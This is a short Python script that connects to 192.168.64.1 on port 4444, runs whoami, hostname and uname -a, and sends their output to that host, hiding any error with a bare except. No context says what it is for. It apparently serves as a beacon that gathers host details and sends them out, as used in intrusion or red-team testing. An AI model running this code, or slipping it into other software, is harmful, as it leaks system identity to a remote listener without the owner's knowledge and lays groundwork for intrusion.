import os, socket
try:
    s = socket.socket()
    s.settimeout(2)
    s.connect(("192.168.64.1", 4444))
    import subprocess
    r = subprocess.run(["whoami"], capture_output=True, text=True, timeout=3)
    h = subprocess.run(["hostname"], capture_output=True, text=True, timeout=3)
    u = subprocess.run(["uname", "-a"], capture_output=True, text=True, timeout=3)
    s.sendall((r.stdout + h.stdout + u.stdout).encode())
    s.close()
except:
    pass
